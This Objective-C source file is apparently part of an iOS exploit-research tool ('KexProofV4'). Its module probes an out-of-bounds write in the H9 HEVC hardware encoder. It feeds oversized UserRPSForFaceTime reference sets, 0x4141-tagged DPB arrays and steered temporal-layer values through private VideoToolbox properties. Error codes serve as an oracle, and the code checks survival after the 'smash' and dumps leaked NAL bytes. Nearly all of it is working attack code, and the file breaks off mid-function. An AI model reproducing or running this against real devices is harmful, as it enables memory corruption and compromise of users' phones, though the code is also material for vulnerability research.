#import "KPH9EncoderModule.h"
#import <UIKit/UIKit.h>
#import "KPLog.h"
#import "KPVMScanPolicy.h"
#import <VideoToolbox/VideoToolbox.h>
#import <CoreMedia/CoreMedia.h>
#import <CoreVideo/CoreVideo.h>
#import <mach/mach.h>
#import <unistd.h>

typedef unsigned int kp_io_object_t;
typedef unsigned int kp_io_service_t;
typedef unsigned int kp_io_connect_t;
extern CFMutableDictionaryRef IOServiceMatching(const char *name);
extern kp_io_service_t IOServiceGetMatchingService(unsigned int mainPort, CFDictionaryRef matching);
extern kern_return_t IOServiceOpen(kp_io_service_t service, unsigned int owningTask, unsigned int type, kp_io_connect_t *conn);
extern kern_return_t IOServiceClose(kp_io_connect_t conn);
extern kern_return_t IOObjectRelease(kp_io_object_t obj);
extern kern_return_t IOConnectCallMethod(kp_io_connect_t conn, uint32_t selector,
                                         const uint64_t *input, uint32_t inputCnt,
                                         const void *inputStruct, size_t inputStructCnt,
                                         uint64_t *output, uint32_t *outputCnt,
                                         void *outputStruct, size_t *outputStructCnt);
extern kern_return_t IOConnectCallStructMethod(kp_io_connect_t conn, uint32_t selector,
                                               const void *inputStruct, size_t inputStructCnt,
                                               void *outputStruct, size_t *outputStructCnt);

static void KPH9AttsCB(void *refCon, void *src, OSStatus st, VTEncodeInfoFlags fl, CMSampleBufferRef sb) {
    (void)src;
    (void)fl;
    NSMutableArray *sink = (__bridge NSMutableArray *)refCon;
    if (!sink) return;
    NSString *entry = nil;
    if (!sb) {
        entry = [NSString stringWithFormat:@"cb st=%d no-sample", (int)st];
    } else {
        CFDictionaryRef atts = CMCopyDictionaryOfAttachments(kCFAllocatorDefault, sb,
                                                             kCMAttachmentMode_ShouldPropagate);
        if (atts) {
            NSDictionary *d = (__bridge NSDictionary *)atts;
            entry = [NSString stringWithFormat:@"cb st=%d keys=%lu", (int)st, (unsigned long)d.count];
            CFRelease(atts);
        } else {
            entry = [NSString stringWithFormat:@"cb st=%d atts=(none)", (int)st];
        }
    }
    @synchronized (sink) {
        [sink addObject:entry];
    }
}

static void KPH9Drain(NSMutableArray *sink, int expected, int timeoutMs) {
    if (!sink || expected <= 0) return;
    int waited = 0;
    while (waited < timeoutMs) {
        int now = 0;
        @synchronized (sink) {
            now = (int)sink.count;
        }
        if (now >= expected) break;
        usleep(2000);
        waited += 2;
    }
}

// Analyst Stage 1: the CompleteFrames OSStatus is the oracle - -12912/-12903
// means the frameProperties RPS really hit the parser. Runs on a watchdog
// thread because CompleteFrames itself has no timeout and deadlocks on wedged
// sessions (INT32_MIN = gave up).
static OSStatus KPH9CompleteStatus(VTCompressionSessionRef s, int timeoutMs) {
    if (!s) return INT32_MIN;
    __block OSStatus rc = INT32_MIN;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        rc = VTCompressionSessionCompleteFrames(s, kCMTimeInvalid);
        dispatch_semaphore_signal(sem);
    });
    long w = dispatch_semaphore_wait(sem,
        dispatch_time(DISPATCH_TIME_NOW, (int64_t)timeoutMs * NSEC_PER_MSEC));
    return (w == 0) ? rc : INT32_MIN;
}

// === Stage 6: XPC Bitstream / NAL / Attachments Leak & Exact DPB Boundary ===
// (analyst module, integrated; its bare CompleteFrames(kCMTimeInvalid) replaced
// with a bounded poll - that call deadlocks on wedged sessions)
typedef struct {
    volatile int cbCount;
    OSStatus lastStatus;
    char summary[512];
    char first[512]; // Stage 7: keep cb#1 (IDR, carries the SPS) alongside cb#2
} Stage6ProbeResult;

static NSString *HexDumpSlice(const uint8_t *buf, size_t len, size_t maxBytes) {
    size_t n = (len < maxBytes) ? len : maxBytes;
    NSMutableString *hex = [NSMutableString stringWithCapacity:n * 2];
    for (size_t i = 0; i < n; i++) {
        [hex appendFormat:@"%02x", buf[i]];
    }
    return hex;
}

static void Stage6OutputCallback(void *outputCallbackRefCon,
                                 void *sourceFrameRefCon,
                                 OSStatus status,
                                 VTEncodeInfoFlags infoFlags,
                                 CMSampleBufferRef sampleBuffer) {
    Stage6ProbeResult *res = (Stage6ProbeResult *)outputCallbackRefCon;
    if (!res) return;
    res->cbCount++;
    res->lastStatus = status;
    if (status != noErr || !sampleBuffer) {
        snprintf(res->summary, sizeof(res->summary),
                 "cb#%d st=%d info=0x%x sbuf=NULL",
                 res->cbCount, (int)status, (unsigned)infoFlags);
        if (res->cbCount == 1) snprintf(res->first, sizeof(res->first), "%s", res->summary);
        return;
    }
    // Real SampleAttachments (array of dicts - CMCopyDictionaryOfAttachments is empty)
    CFArrayRef saArray = CMSampleBufferGetSampleAttachmentsArray(sampleBuffer, false);
    NSUInteger saKeys = 0;
    if (saArray && CFArrayGetCount(saArray) > 0) {
        CFDictionaryRef dict = (CFDictionaryRef)CFArrayGetValueAtIndex(saArray, 0);
        if (dict && CFGetTypeID(dict) == CFDictionaryGetTypeID()) {
            saKeys = CFDictionaryGetCount(dict);
        }
    }
    // VPS/SPS/PPS from CMFormatDescription (serialized inside VTEncoderXPCService)
    CMFormatDescriptionRef fmt = CMSampleBufferGetFormatDescription(sampleBuffer);
    size_t paramCount = 0;
    NSString *spsHex = @"none";
    if (fmt) {
        CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 0, NULL, NULL, &paramCount, NULL);
        const uint8_t *spsPtr = NULL;
        size_t spsSize = 0;
        if (CMVideoFormatDescriptionGetHEVCParameterSetAtIndex(fmt, 1, &spsPtr, &spsSize, NULL, NULL) == noErr && spsPtr) {
            spsHex = HexDumpSlice(spsPtr, spsSize, 24);
        }
    }
    // First bytes of the Slice NAL (short-term RPS header lives here)
    CMBlockBufferRef block = CMSampleBufferGetDataBuffer(sampleBuffer);
    NSString *nalHex = @"none";
    size_t totalLen = 0;
    if (block) {
        char *dataPtr = NULL;
        size_t lengthAtOffset = 0;
        if (CMBlockBufferGetDataPointer(block, 0, &lengthAtOffset, &totalLen, &dataPtr) == noErr && dataPtr) {
            nalHex = HexDumpSlice((const uint8_t *)dataPtr, lengthAtOffset, 24);
        }
    }
    snprintf(res->summary, sizeof(res->summary),
             "cb#%d st=%d info=0x%x saKeys=%lu ps=%zu sps=%s nal(%zu)=%s",
             res->cbCount, (int)status, (unsigned)infoFlags,
             (unsigned long)saKeys, paramCount,
             [spsHex UTF8String], totalLen, [nalHex UTF8String]);
    if (res->cbCount == 1) snprintf(res->first, sizeof(res->first), "%s", res->summary);
}

static CVPixelBufferRef CreateDummyNV12Buffer(int width, int height) {
    CVPixelBufferRef px = NULL;
    NSDictionary *attrs = @{
        (id)kCVPixelBufferIOSurfacePropertiesKey : @{}
    };
    CVPixelBufferCreate(kCFAllocatorDefault, width, height,
                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                        (__bridge CFDictionaryRef)attrs, &px);
    return px;
}

static void RunStage6_XPCLeakAndBoundaryAudit(NSMutableString *log) {
    [log appendString:@"\n--- Stage 6: DPB Exact Boundary (1..15, 34..48) & Bitstream/NAL Leak Audit ---\n"];
    int probeCounts[] = {
        1, 2, 3, 4, 8, 15,
        34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48
    };
    size_t numProbes = sizeof(probeCounts) / sizeof(probeCounts[0]);
    CVPixelBufferRef px = CreateDummyNV12Buffer(192, 144);
    if (!px) {
        [log appendString:@"  [!] Failed to allocate CVPixelBuffer\n"];
        return;
    }
    for (size_t i = 0; i < numProbes; i++) {
        int count = probeCounts[i];
        Stage6ProbeResult res = {0};
        snprintf(res.summary, sizeof(res.summary), "(no cb)");
        VTCompressionSessionRef session = NULL;
        OSStatus st = VTCompressionSessionCreate(
            kCFAllocatorDefault, 192, 144,
            kCMVideoCodecType_HEVC, NULL, NULL, NULL,
            Stage6OutputCallback, &res, &session);
        if (st != noErr || !session) {
            [log appendFormat:@"  dpb[x%-2d] create=%d\n", count, (int)st];
            continue;
        }
        NSMutableArray *dpbArr = [NSMutableArray arrayWithCapacity:count];
        for (int k = 0; k < count; k++) {
            uint64_t tagged = 0x4141414141410000ULL | (uint64_t)k;
            CFNumberRef num = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt64Type, &tagged);
            [dpbArr addObject:(__bridge_transfer id)num];
        }
        OSStatus setSt = VTSessionSetProperty(
            session,
            CFSTR("UserDPBFramesForFaceTime"),
            (__bridge CFTypeRef)dpbArr);
        VTCompressionSessionPrepareToEncodeFrames(session);
        CMTime pts0 = CMTimeMake(0, 30);
        CMTime pts1 = CMTimeMake(1, 30);
        VTCompressionSessionEncodeFrame(session, px, pts0, kCMTimeInvalid, NULL, NULL, NULL);
        VTCompressionSessionEncodeFrame(session, px, pts1, kCMTimeInvalid, NULL, NULL, NULL);
        // Bounded wait for the 2 callbacks - never CompleteFrames(kCMTimeInvalid).
        int waited = 0;
        while (res.cbCount < 2 && waited < 300) { usleep(2000); waited += 2; }
        [log appendFormat:@"  dpb[tagged x%-2d] set=%-6d -> %s\n",
                          count, (int)setSt, res.summary];
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
    }
    // 6B: NTL clamp steering via extreme ExpectedFrameRate / BaseLayerFrameRate ratios
    [log appendString:@"  [6B: Dyadic Clamp Ratio Steering (ExpectedFrameRate / BaseLayerFrameRate)]\n"];
    double baseRates[] = { 15.0, 7.5, 3.75, 1.0, 0.5, 0.25, 0.0625 };
    for (size_t i = 0; i < sizeof(baseRates) / sizeof(baseRates[0]); i++) {
        VTCompressionSessionRef session = NULL;
        if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144,
                                       kCMVideoCodecType_HEVC, NULL, NULL, NULL,
                                       Stage6OutputCallback, NULL, &session) == noErr && session) {
            int expFps = 240;
            double baseFps = baseRates[i];
            CFNumberRef nExp = CFNumberCreate(NULL, kCFNumberIntType, &expFps);
            CFNumberRef nBase = CFNumberCreate(NULL, kCFNumberDoubleType, &baseFps);
            VTSessionSetProperty(session, kVTCompressionPropertyKey_ExpectedFrameRate, nExp);
            VTSessionSetProperty(session, kVTCompressionPropertyKey_BaseLayerFrameRate, nBase);
            OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(session);
            CFNumberRef postNtlRef = NULL;
            int postNtl = -1;
            if (VTSessionCopyProperty(session, CFSTR("NumberOfTemporalLayers"), NULL, &postNtlRef) == noErr && postNtlRef) {
                CFNumberGetValue(postNtlRef, kCFNumberIntType, &postNtl);
                CFRelease(postNtlRef);
            }
            [log appendFormat:@"  ratio 240/%.4f -> prep=%d POST_NTL=%d\n",
                              baseFps, (int)prepSt, postNtl];
            CFRelease(nExp);
            CFRelease(nBase);
            VTCompressionSessionInvalidate(session);
            CFRelease(session);
        }
    }
    CVPixelBufferRelease(px);
}

// === Stage 7 (analyst): WHY -17691? value x count matrix before Prepare with
// AllowFrameReordering=NO + UserRPS container-format ladder.
static void Stage7DPBRow(NSMutableString *log, int count, long long val, BOOL afterPrepare) {
    Stage6ProbeResult res;
    memset(&res, 0, sizeof(res));
    snprintf(res.summary, sizeof(res.summary), "(no cb)");
    snprintf(res.first, sizeof(res.first), "(no cb)");
    VTCompressionSessionRef session = NULL;
    OSStatus st = VTCompressionSessionCreate(
        kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
        NULL, NULL, NULL, Stage6OutputCallback, &res, &session);
    if (st != noErr || !session) {
        [log appendFormat:@"  dpb x%-2d val=0x%llx create=%d\n", count, val, (int)st];
        return;
    }
    // Analyst: reordering OFF so the P-frame callback cannot lag behind.
    VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
    VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
    NSMutableArray *arr = [NSMutableArray arrayWithCapacity:(NSUInteger)count];
    for (int k = 0; k < count; k++) [arr addObject:@(val)];
    OSStatus setSt = 0;
    if (!afterPrepare) {
        setSt = VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
    }
    VTCompressionSessionPrepareToEncodeFrames(session);
    if (afterPrepare) {
        setSt = VTSessionSetProperty(session, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)arr);
    }
    CVPixelBufferRef px = CreateDummyNV12Buffer(192, 144);
    if (px) {
        VTCompressionSessionEncodeFrame(session, px, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
        VTCompressionSessionEncodeFrame(session, px, CMTimeMake(1, 30), kCMTimeInvalid, NULL, NULL, NULL);
        int waited = 0;
        while (res.cbCount < 2 && waited < 300) { usleep(2000); waited += 2; }
        CVPixelBufferRelease(px);
    }
    [log appendFormat:@"  dpb x%-2d val=0x%016llx set@%s=%d cbs=%d | first: %s | last: %s\n",
     count, val, afterPrepare ? "post" : "pre", (int)setSt, res.cbCount, res.first, res.summary];
    VTCompressionSessionInvalidate(session);
    CFRelease(session);
}

static void RunStage7_MalfunctionMatrix(NSMutableString *log) {
    [log appendString:@"\n--- Stage 7: -17691 value x count matrix + UserRPS container ladder ---\n"];

    // 7A: uniform values at the biting count x34 (set BEFORE prepare)
    [log appendString:@"  [7A: x34 uniform values, set BEFORE prepare, reordering=NO]\n"];
    long long vals[] = { 0, 1, 15, 16, 31, 32, 34, 35, -1, 0x4141414141410000LL };
    for (int vi = 0; vi < 10; vi++) {
        Stage7DPBRow(log, 34, vals[vi], NO);
    }
    // 7B: counts x {valid 0, tagged} - does a valid index avoid -17691?
    [log appendString:@"  [7B: counts x val(0 vs tagged), set BEFORE prepare]\n"];
    int cnts[] = { 2, 4, 8, 15, 16, 34 };
    long long bvals[] = { 0, 0x4141414141410000LL };
    for (int ci = 0; ci < 6; ci++) {
        for (int vi = 0; vi < 2; vi++) {
            Stage7DPBRow(log, cnts[ci], bvals[vi], NO);
        }
    }
    // 7B-control: Stage 3 timing (set AFTER prepare) with the biting payload
    [log appendString:@"  [7B-control: x34 tagged set AFTER prepare (Stage 3 timing)]\n"];
    Stage7DPBRow(log, 34, 0x4141414141410000LL, YES);

    // 7C: UserRPSForFaceTime container-format ladder (analyst: why -12912?)
    [log appendString:@"  [7C: UserRPS container ladder (fresh session per candidate)]\n"];
    NSMutableArray *s0 = [NSMutableArray array], *s1 = [NSMutableArray array];
    for (int i = 0; i < 32; i++) { [s0 addObject:@(-(i + 1))]; [s1 addObject:@(i + 1)]; }
    NSDictionary *rpsDict = @{
        @"AbsDeltaRPSMinus1": s0, @"DeltaRPSSign": s1,
        @"NumNegativePics": @32, @"NumPositivePics": @32,
        @"UsedByCurrPicS0": @0xFFFFFFFFU, @"UsedByCurrPicS1": @0xFFFFFFFFU,
    };
    NSMutableArray *flat = [NSMutableArray array];
    [flat addObjectsFromArray:s0];
    [flat addObjectsFromArray:s1];
    int64_t blob[64];
    for (int i = 0; i < 32; i++) { blob[i] = -(int64_t)(i + 1); blob[32 + i] = (int64_t)(i + 1); }
    NSData *cfdata = [NSData dataWithBytes:blob length:sizeof(blob)];
    NSArray *cands = @[ @[rpsDict], rpsDict, flat, cfdata ];
    NSArray *names = @[ @"wrapped @[dict]", @"bare dict", @"flat 64 numbers", @"CFData 512B" ];
    for (NSUInteger ci = 0; ci < cands.count; ci++) {
        Stage6ProbeResult res;
        memset(&res, 0, sizeof(res));
        snprintf(res.summary, sizeof(res.summary), "(no cb)");
        snprintf(res.first, sizeof(res.first), "(no cb)");
        VTCompressionSessionRef session = NULL;
        NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
        OSStatus st = VTCompressionSessionCreate(
            kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
            (__bridge CFDictionaryRef)spec, NULL, NULL, Stage6OutputCallback, &res, &session);
        if (st != noErr || !session) {
            [log appendFormat:@"  rps[%@] create=%d\n", names[ci], (int)st];
            continue;
        }
        VTSessionSetProperty(session, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
        VTSessionSetProperty(session, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        OSStatus setSt = VTSessionSetProperty(session, CFSTR("UserRPSForFaceTime"),
                                              (__bridge CFTypeRef)cands[ci]);
        VTCompressionSessionPrepareToEncodeFrames(session);
        OSStatus e1 = -1;
        CVPixelBufferRef px = CreateDummyNV12Buffer(192, 144);
        if (px) {
            VTCompressionSessionEncodeFrame(session, px, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
            NSDictionary *fp = @{ @"UserRPSForFaceTime": cands[ci] };
            e1 = VTCompressionSessionEncodeFrame(session, px, CMTimeMake(1, 30), kCMTimeInvalid,
                                                 (__bridge CFDictionaryRef)fp, NULL, NULL);
            int waited = 0;
            while (res.cbCount < 2 && waited < 300) { usleep(2000); waited += 2; }
            CVPixelBufferRelease(px);
        }
        [log appendFormat:@"  rps[%@] set=%d frameEncode=%d cbs=%d | first: %s | last: %s\n",
         names[ci], (int)setSt, (int)e1, res.cbCount, res.first, res.summary];
        VTCompressionSessionInvalidate(session);
        CFRelease(session);
    }
}

static CVPixelBufferRef KPH9CreatePixelBuffer(int width, int height) {
    CVPixelBufferRef pb = NULL;
    if (CVPixelBufferCreate(kCFAllocatorDefault, width, height,
                            kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
                            NULL, &pb) == kCVReturnSuccess && pb) {
        CVPixelBufferLockBaseAddress(pb, 0);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 0), 0x40,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 0) * (size_t)height);
        memset(CVPixelBufferGetBaseAddressOfPlane(pb, 1), 0x80,
               CVPixelBufferGetBytesPerRowOfPlane(pb, 1) * ((size_t)height / 2));
        CVPixelBufferUnlockBaseAddress(pb, 0);
    }
    return pb;
}

// Executes a VideoToolbox stage on a detached queue with a hard wall-clock
// timeout so a wedged or launchd-throttled videocodecd XPC pipe can never
// hang runReport or the UI workQueue.
static NSString *KPH9RunTimed(NSString *label, int64_t timeoutMs, BOOL *outTimedOut, NSString *(^block)(void)) {
    NSMutableArray<NSString *> *box = [NSMutableArray array];
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    dispatch_queue_t q = dispatch_queue_create("com.stealth.kexproofv4.h9.stage", DISPATCH_QUEUE_CONCURRENT);
    dispatch_async(q, ^{
        NSString *res = nil;
        @try {
            res = block() ?: @"";
        } @catch (NSException *ex) {
            res = [NSString stringWithFormat:@"  [EXCEPTION in %@: %@]\n", label, ex.reason];
        }
        @synchronized (box) {
            [box addObject:res];
        }
        dispatch_semaphore_signal(sem);
    });
    dispatch_time_t deadline = dispatch_time(DISPATCH_TIME_NOW, timeoutMs * (int64_t)NSEC_PER_MSEC);
    if (dispatch_semaphore_wait(sem, deadline) != 0) {
        if (outTimedOut) *outTimedOut = YES;
        return [NSString stringWithFormat:
                @"  [TIMEOUT %lld ms in %@ — videocodecd XPC unresponsive / throttled]\n",
                timeoutMs, label];
    }
    if (outTimedOut) *outTimedOut = NO;
    @synchronized (box) {
        return box.firstObject ?: @"";
    }
}

@interface KPH9EncoderModule ()
@property (nonatomic, copy) NSString *identifier;
@property (nonatomic, copy) NSString *title;
@property (nonatomic, copy) NSString *subtitle;
@property (nonatomic, copy) NSString *icon;
@property (nonatomic, assign) KPTestSection section;
@end

@implementation KPH9EncoderModule

- (instancetype)initWithNameSweep {
    self = [super init];
    if (self) {
        _identifier = @"h9encoder.oob";
        _title = @"H9 encoder OOB write";
        _subtitle = @"AVE_HEVC_ST_RPS_Retrieve & DPB/NTL audit (bounded XPC)";
        _icon = @"video";
        _section = KPTestSectionKernelProbes;
    }
    return self;
}

- (void)resetJournal {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    [[NSFileManager defaultManager] createFileAtPath:path contents:[NSData data] attributes:nil];
}

- (void)journal:(NSString *)line {
    NSString *path = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES).firstObject
                      stringByAppendingPathComponent:@"kp-h9-journal.log"];
    NSFileHandle *fh = [NSFileHandle fileHandleForWritingAtPath:path];
    if (!fh) {
        [[NSFileManager defaultManager] createFileAtPath:path contents:nil attributes:nil];
        fh = [NSFileHandle fileHandleForWritingAtPath:path];
    }
    [fh seekToEndOfFile];
    [fh writeData:[[line stringByAppendingString:@"\n"] dataUsingEncoding:NSUTF8StringEncoding]];
    [fh synchronizeFile];
    [fh closeFile];
    [KPLog.shared appendFormat:@"[h9] %@", line];
}

- (NSString *)runReport {
    [self resetJournal];
    [self journal:@"=== H9 clean rebuild start ==="];

    NSMutableString *report = [NSMutableString string];
    [report appendString:@"=== KexProofV4 · H9 Encoder OOB Write (Clean Rebuild) ===\n"];
    [report appendFormat:@"Target: iOS %@ uid=%d pid=%d\n",
     UIDevice.currentDevice.systemVersion, getuid(), getpid()];

    BOOL vtHung = NO;

    // -------------------------------------------------------------------------
    // Stage 1: AVE_HEVC_ST_RPS_Retrieve (UserRPSForFaceTime 2+2 vs 32+32 OOB)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 1: RPS OOB probe"];
    [report appendString:@"\n--- Stage 1: AVE_HEVC_ST_RPS_Retrieve (UserRPSForFaceTime) ---\n"];
    NSString *s1 = KPH9RunTimed(@"Stage1-RPS", 3000, &vtHung, ^NSString *{
        NSMutableString *out = [NSMutableString string];
        NSMutableArray *cbSink = [NSMutableArray array];
        NSDictionary *spec = @{ @"EnableUserRefForFacetime": @YES };
        VTCompressionSessionRef s = NULL;
        OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                 kCMVideoCodecType_HEVC,
                                                 (__bridge CFDictionaryRef)spec,
                                                 NULL, NULL, KPH9AttsCB,
                                                 (__bridge void *)cbSink, &s);
        [out appendFormat:@"  session create -> %d\n", (int)st];
        if (st != noErr || !s) return out;

        VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
        // Analyst: reordering OFF - the P-frame cb must not lag into the next read.
        VTSessionSetProperty(s, kVTCompressionPropertyKey_AllowFrameReordering, kCFBooleanFalse);
        OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
        [out appendFormat:@"  prepare -> %d\n", (int)prep];

        NSMutableArray *s0s = [NSMutableArray array], *s1s = [NSMutableArray array];
        for (int i = 0; i < 2; i++) { [s0s addObject:@(-(i + 1))]; [s1s addObject:@(i + 1)]; }
        NSDictionary *rpsSane = @{
            @"AbsDeltaRPSMinus1": s0s, @"DeltaRPSSign": s1s,
            @"NumNegativePics": @2, @"NumPositivePics": @2,
            @"UsedByCurrPicS0": @3U, @"UsedByCurrPicS1": @3U,
        };

        NSMutableArray *s0oob = [NSMutableArray array], *s1oob = [NSMutableArray array];
        for (int i = 0; i < 32; i++) { [s0oob addObject:@(-(i + 1))]; [s1oob addObject:@(i + 1)]; }
        NSDictionary *rpsOOB = @{
            @"AbsDeltaRPSMinus1": s0oob, @"DeltaRPSSign": s1oob,
            @"NumNegativePics": @32, @"NumPositivePics": @32,
            @"UsedByCurrPicS0": @0xFFFFFFFFU, @"UsedByCurrPicS1": @0xFFFFFFFFU,
        };

        OSStatus stSane = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsSane]);
        OSStatus stOOB  = VTSessionSetProperty(s, CFSTR("UserRPSForFaceTime"), (__bridge CFTypeRef)@[rpsOOB]);
        [out appendFormat:@"  session set UserRPS sane(2+2)=%d oob(32+32)=%d\n", (int)stSane, (int)stOOB];

        CVPixelBufferRef pb = KPH9CreatePixelBuffer(1280, 720);
        if (pb) {
            @synchronized (cbSink) { [cbSink removeAllObjects]; }
            OSStatus e0 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
            if (e0 == noErr) KPH9Drain(cbSink, 1, 60);
            NSString *cb0 = nil;
            @synchronized (cbSink) { cb0 = cbSink.firstObject ?: @"(no cb)"; [cbSink removeAllObjects]; }
            [out appendFormat:@"  encode[0] clean IDR -> %d (%@)\n", (int)e0, cb0];

            NSDictionary *fp = @{
                @"UserRPSForFaceTime": @[rpsOOB],
                @"AbsDeltaRPSMinus1": s0oob,
                @"DeltaRPSSign": s1oob,
            };
            OSStatus e1 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(1, 30), kCMTimeInvalid,
                                                          (__bridge CFDictionaryRef)fp, NULL, NULL);
            if (e1 == noErr) KPH9Drain(cbSink, 1, 80);
            NSString *cb1 = nil;
            @synchronized (cbSink) { cb1 = cbSink.firstObject ?: @"(no cb)"; [cbSink removeAllObjects]; }
            [out appendFormat:@"  encode[1] frameProps RPS(32+32) -> %d (%@)\n", (int)e1, cb1];

            // Analyst strike 1: CompleteFrames status is the parser oracle.
            OSStatus cfSt = KPH9CompleteStatus(s, 500);
            [out appendFormat:@"  CompleteFrames after smash -> %d%s\n", (int)cfSt,
             (cfSt == INT32_MIN) ? " (TIMEOUT - pipeline wedged)" : ""];
            // Clear the sink: CompleteFrames may have pushed encode[1]'s late
            // callback in here - the old readout made encode[2] steal it.
            @synchronized (cbSink) { [cbSink removeAllObjects]; }
            // Survival probe: second P-frame into the same session - did the
            // XPC worker/encoder die on encode[1] or swallow the 32+32 RPS?
            OSStatus e2 = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(2, 30), kCMTimeInvalid,
                                                          NULL, NULL, NULL);
            if (e2 == noErr) KPH9Drain(cbSink, 1, 80);
            NSString *cb2 = nil;
            @synchronized (cbSink) { cb2 = cbSink.firstObject ?: @"(no cb)"; }
            [out appendFormat:@"  encode[2] post-smash P-frame -> %d (%@)\n", (int)e2, cb2];
            CVPixelBufferRelease(pb);
        }

        VTCompressionSessionInvalidate(s);
        CFRelease(s);
        return out;
    });
    [report appendString:s1];

    // -------------------------------------------------------------------------
    // Stage 2: NumberOfTemporalLayers (NTL) Unclamp & Steered x0 Audit
    //   2A: with ExpectedFrameRate=60 / BaseLayerFrameRate=15 (dyadic clamp -> 3)
    //   2B: raw EncoderUsage=1 without BaseLayerFrameRate (unclamped readback)
    // -------------------------------------------------------------------------
    [self journal:@"Stage 2: NTL unclamp & steered x0 (60/15 clamped vs raw unclamped)"];
    [report appendString:@"\n--- Stage 2: NTL Unclamp & Steered x0 Audit ---\n"];
    if (vtHung) {
        [report appendString:@"  skipped (videocodecd XPC timed out in Stage 1)\n"];
    } else {
        NSString *s2 = KPH9RunTimed(@"Stage2-NTL", 2500, &vtHung, ^NSString *{
            NSMutableString *out = [NSMutableString string];
            CVPixelBufferRef pb = KPH9CreatePixelBuffer(1280, 720);
            int ntlVals[] = { 3, 8, 16000, 16447 };
            [out appendString:@"  [2A: with ExpectedFrameRate=60 / BaseLayerFrameRate=15 -> dyadic clamp 1+log2(60/15)=3]\n"];
            for (int i = 0; i < 4; i++) {
                int ntl = ntlVals[i];
                uint64_t x0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
                NSDictionary *spec = @{
                    @"EncoderUsage": @1,
                    @"NumberOfTemporalLayers": @(ntl),
                    @"AllowTemporalCompression": @YES,
                };
                VTCompressionSessionRef s = NULL;
                OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                         kCMVideoCodecType_HEVC,
                                                         (__bridge CFDictionaryRef)spec,
                                                         NULL, NULL, NULL, NULL, &s);
                if (st != noErr || !s) {
                    [out appendFormat:@"  60/15 NTL=%-5d create=%d\n", ntl, (int)st];
                    continue;
                }
                VTSessionSetProperty(s, CFSTR("AllowTemporalCompression"), kCFBooleanTrue);
                VTSessionSetProperty(s, CFSTR("RealTime"), kCFBooleanTrue);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_ExpectedFrameRate, (__bridge CFNumberRef)@60);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_AverageBitRate, (__bridge CFNumberRef)@4000000);
                VTSessionSetProperty(s, kVTCompressionPropertyKey_BaseLayerFrameRate, (__bridge CFNumberRef)@15);
                VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(ntl));

                int pre = -1, post = -1;
                CFNumberRef rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &pre);
                    CFRelease(rb);
                }
                OSStatus prep = VTCompressionSessionPrepareToEncodeFrames(s);
                rb = NULL;
                if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                    CFNumberGetValue(rb, kCFNumberIntType, &post);
                    CFRelease(rb);
                }
                OSStatus enc = -1;
                if (pb) {
                    enc = VTCompressionSessionEncodeFrame(s, pb, CMTimeMake(0, 30), kCMTimeInvalid, NULL, NULL, NULL);
                }
                [out appendFormat:@"  60/15 NTL=%-5d x0=0x%016llx prep=%d PRE=%d POST=%d enc=%d\n",
                 ntl, x0, (int)prep, pre, post, (int)enc];
                VTCompressionSessionInvalidate(s);
                CFRelease(s);
            }

            [out appendString:@"  [2B: raw EncoderUsage=1 without BaseLayerFrameRate -> unclamped NTL]\n"];
            int rawVals[] = { 3, 8, 16000, 16447, 16463 };
            for (int i = 0; i < 5; i++) {
                int ntl = rawVals[i];
                uint64_t x0 = ((uint64_t)(uint32_t)(ntl - 16463) << 32) | 0x59ULL;
                VTCompressionSessionRef s = NULL;
                OSStatus st = VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720,
                                                         kCMVideoCodecType_HEVC,
                                                         NULL, NULL, NULL, NULL, NULL, &s);
                if (st != noErr || !s) {
